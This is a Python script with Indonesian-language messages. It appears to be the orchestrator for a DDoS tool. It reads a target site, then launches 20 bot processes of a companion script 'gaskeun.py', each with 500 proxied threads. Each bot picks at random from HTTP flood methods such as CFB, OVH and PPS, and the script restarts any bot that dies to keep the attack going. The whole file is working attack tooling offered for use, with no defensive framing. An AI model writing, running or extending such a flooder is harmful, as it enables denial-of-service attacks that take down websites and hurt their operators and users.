import os, random, subprocess, time, sys

method = ["CFB", "GET", "POST", "OVH", "STRESS", "BRUST", "DYN", "HEAD", "PPS", "EVEN"]

def gas():
    if os.path.exists('target.txt'):
        with open('target.txt', 'r') as f:
            target_site = f.read().strip()
        if target_site:
            print(f'Target      : {target_site} (dari target.txt)')
        else:
            target_site = input('Target      : ')
    else:
        target_site = input('Target      : ')

    proxy_types = '1'
    print('Proxy_Type  : 1 (HTTP CONNECT — tested alive)')

    jumlah_bot = 20
    threads = '500'
    print(f'Jumlah Bot  : {jumlah_bot} x {threads} threads = 10000 concurrent')

    processes = []
    for _ in range(jumlah_bot):
        bot_method = random.choice(method).lower()
        cmd = [
            sys.executable, 'gaskeun.py',
            bot_method, target_site, proxy_types, threads,
            'alive.txt', '200', '1000'
        ]
        print(f'Memulai bot {_} dengan metode: {bot_method}')
        p = subprocess.Popen(cmd)
        processes.append((p, cmd, _))

    print('Semua bot telah aktif. Memantau status bot... (Tekan Ctrl+C untuk menghentikan)')

    try:
        while True:
            time.sleep(5)
            for idx, (p, cmd, bot_num) in enumerate(processes):
                if p.poll() is not None:
                    print(f'Bot {bot_num} mati dengan kode {p.returncode}. Merestart bot...')
                    new_p = subprocess.Popen(cmd)
                    processes[idx] = (new_p, cmd, bot_num)
    except KeyboardInterrupt:
        print('Menghentikan semua bot...')
        for p, _, _ in processes:
            p.terminate()
        print('Semua bot berhasil dihentikan.')


if __name__=='__main__':
    gas()
